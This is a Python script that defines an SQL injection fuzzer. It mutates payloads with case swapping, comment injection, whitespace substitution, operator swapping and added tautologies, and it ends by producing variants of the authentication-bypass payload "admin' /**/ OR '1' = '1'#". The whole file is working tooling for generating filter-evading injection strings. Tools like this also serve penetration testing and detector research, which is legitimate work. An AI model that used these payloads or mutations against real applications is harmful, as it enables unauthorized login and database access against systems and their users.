import random
import re

def type_check(obj, type, name):
    if not isinstance(obj, type):
        raise TypeError(name + ' must be of type ' + str(type))
    
def replace_random(candidate, sub, wanted):
    type_check(candidate, str, "candidate")
    type_check(sub, str, "sub")
    type_check(wanted, str, "wanted")
    occurrences = [m.start() for m in re.finditer(re.escape(sub), candidate)]
    if not occurrences:
        return candidate

    pos = random.choice(occurrences)

    before = candidate[:pos]
    after = candidate[pos:]
    after = after.replace(sub, wanted, 1)

    result = before + after
    return result

def random_string(length):
    #generate a random string of length 'length'
    #e.g. random_string(5) -> 'aBcDe'
    dictionary = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.choice(dictionary) for i in range(random.randint(1,length)))

def filter_candidates(symbols,payload):
    type_check(symbols, dict, 'symbols')
    type_check(payload, str, 'payload')

    return [s for s in symbols.keys() if s in payload]

def random_string_true_logic():
    #randomly generate a string
    #e.g. 'abc' -> abc and 1=1
    random_str = random_string(6)

    true_logic = [
        # equals
        "'{}'='{}'".format(random_str,random_str),
        "'{}' LIKE '{}'".format(random_str,random_str),
        '"{}"="{}"'.format(random_str,random_str),
        '"{}" LIKE "{}"'.format(random_str,random_str),

        # not equals
        "'{}'!='{}'".format(random_str,random_str + random_string(1)),
        "'{}' NOT LIKE '{}'".format(random_str,random_str + random_string(1)),
        "'{}'<>'{}'".format(random_str,random_str + random_string(1)),
        '"{}"!="{}"'.format(random_str,random_str + random_string(1)),
        '"{}" NOT LIKE "{}"'.format(random_str,random_str + random_string(1)),
        '"{}"<>"{}"'.format(random_str,random_str + random_string(1)),
    ]
    return random.choice(true_logic)

def random_string_false_logic():
    #randomly generate a string
    #e.g. 'abc' -> abc and 1=2
    random_str = random_string(6)

    false_logic = [
        # equals
        "'{}'='{}'".format(random_str,random_str + random_string(1)),
        "'{}' LIKE '{}'".format(random_str,random_str + random_string(1)),
        '"{}"="{}"'.format(random_str,random_str + random_string(1)),
        '"{}" LIKE "{}"'.format(random_str,random_str + random_string(1)),

        # not equals
        "'{}'!='{}'".format(random_str,random_str),
        "'{}' NOT LIKE '{}'".format(random_str,random_str),
        "'{}'<>'{}'".format(random_str,random_str),
        '"{}"!="{}"'.format(random_str,random_str),
        '"{}" NOT LIKE "{}"'.format(random_str,random_str),
        '"{}"<>"{}"'.format(random_str,random_str),
    ]
    return random.choice(false_logic)

def random_num_true_logic():
    #randomly generate a number
    #e.g. 1 -> 1=1
    random_num = random.randint(1,1000)

    true_logic = [
        # equals
        "{}={}".format(random_num,random_num),
        "{} LIKE {}".format(random_num,random_num),

        # not equals
        "{}!={}".format(random_num,random_num + 1),
        "{} NOT LIKE {}".format(random_num,random_num + 1),
        "{}<>{}".format(random_num,random_num + 1),
    ]
    return random.choice(true_logic)

def random_num_false_logic():
    #randomly generate a number
    #e.g. 1 -> 1=2
    random_num = random.randint(1,1000)

    false_logic = [
        # equals
        "{}={}".format(random_num,random_num + 1),
        "{} LIKE {}".format(random_num,random_num + 1),

        # not equals
        "{}!={}".format(random_num,random_num),
        "{} NOT LIKE {}".format(random_num,random_num),
        "{}<>{}".format(random_num,random_num),
    ]
    return random.choice(false_logic)

def case_swapping(payload):
    #randomly swap the case of the payload
    #e.g. 'aBc' -> 'AbC'
    new_payload =[]
    for char in payload:
        if random.randint(0,1):
            new_payload.append(char.upper())
        else:
            new_payload.append(char.lower())
    return ''.join(new_payload)

def comment_injection(payload):
    #randomly inject a comment into the payload
    #e.g. 'aBc' -> 'aBc--' or 'aBc#' or 'aBc/*abc*/'
    for char in payload:
        #if char is space, tab, newline, carriage return, form feed, or vertical tab, then add a comment
        if char in [' ', '\t', '\n', '\r', '\f', '\v']:
            if random.randint(0,1):
                payload = payload[:payload.index(char)] + "/*" + random_string(6) + "*/" + payload[payload.index(char):]
    if random.randint(0,1):
        payload = payload + '--' + random_string(6)
    else:
        payload = payload + '#' + random_string(6)

    return payload
    

def comment_rewriting(payload):
    #randomly rewrite the payload as a comment
    #e.g. '# or -- ' -> '#aNd or -- aNd'
    if ('#' in payload or '--' in payload):
        payload = payload + random_string(6)
    if ('*/' in payload):
        payload = payload.replace('*/', random_string(6) + '*/')
    return payload

def whitespace_substitution(payload):
    #randomly substitute whitespace 
    #e.g. 'a b'' -> 'a \t b'
    whitespace = [' ', '\t', '\n', '\r', '\f', '\v']
    new_payload = []
    for char in payload:
        if char in whitespace:
            new_payload.append(random.choice(whitespace))
        else:
            new_payload.append(char)
    return ''.join(new_payload)

def integer_encoding(payload):
    #change decimal to hex
    #e.g. '123' -> '0x7b'
    #search for decimal in payload
    decimal = re.findall(r'\d+', payload)
    for d in decimal:
        payload = payload.replace(d, '0x' + hex(int(d))[2:])
    return payload

def operator_swapping(payload):
    #change operators to their equivalent
    #e.g. 'and' -> '&&'
    symbols = {
        # OR
        "||": [" OR ", " || "],
        " || ": [" OR ", "||"],
        "OR": [" OR ", "||"],
        "  OR  ": [" OR ", "||", " || "],
        # AND
        "&&": [" AND ", " && "],
        " && ": ["AND", " AND ", " && "],
        "AND": [" AND ", "&&", " && "],
        "  AND  ": [" AND ", "&&"],
        # Not equals
        "<>": ["!=", " NOT LIKE "],
        "!=": [" != ", "<>", " <> ", " NOT LIKE "],
        # Equals
        " = ": [" LIKE ", "="],
        "LIKE": [" LIKE ", "="]
    }
    symbols_in_payload = filter_candidates(symbols, payload)
    if not symbols_in_payload:
        return payload
    
    #randomly choose a symbol to swap
    symbol_replace = random.choice(symbols_in_payload)
    #check for possible replacements
    replacements = symbols[symbol_replace]
    #randomly choose a replacement
    replacement = random.choice(replacements)
    #replace the symbol with the replacement
    payload = replace_random(payload, symbol_replace, replacement)
    return payload

def logical_invariant(payload):
    cmtpos = re.search(r'(--|#)', payload)
    # no comment in payload
    if not cmtpos:
        return payload
    # comment in payload
    cmtpos = cmtpos.start()
    # create replacement
    replacement = random.choice(
        [
            # AND TRUE
            " AND TRUE",
            " AND 1"
            " AND " + random_string_true_logic(),
            " AND " + random_num_true_logic(),

            # OR FALSE
            " OR FALSE",
            " OR 0",
            " OR " + random_string_false_logic(),
            " OR " + random_num_false_logic(),
        ]
    )

    # replace
    payload = payload[:cmtpos] + replacement + payload[cmtpos:]
    return payload

class SQLiFuzzer(object):
    mutations = [
        case_swapping,
        comment_injection,
        comment_rewriting,
        whitespace_substitution,
        #integer_encoding,
        operator_swapping,
        logical_invariant,
    ]

    def __init__(self, payload):
        self.payload = payload
    
    def mutate(self):
        #randomly choose a mutation
        mutation = random.choice(self.mutations)
        #mutate the payload
        self.payload = mutation(self.payload)
        return self.payload
    
    def mutate_all(self):
        for mutation in self.mutations:
            self.payload = mutation(self.payload)
        return self.payload
    

payload = "admin' /**/ OR '1' = '1'#"

fuzzer = SQLiFuzzer(payload)

#mutate in 5 rounds
for i in range(5):
    fuzzer.mutate()
    print(fuzzer.payload)
    
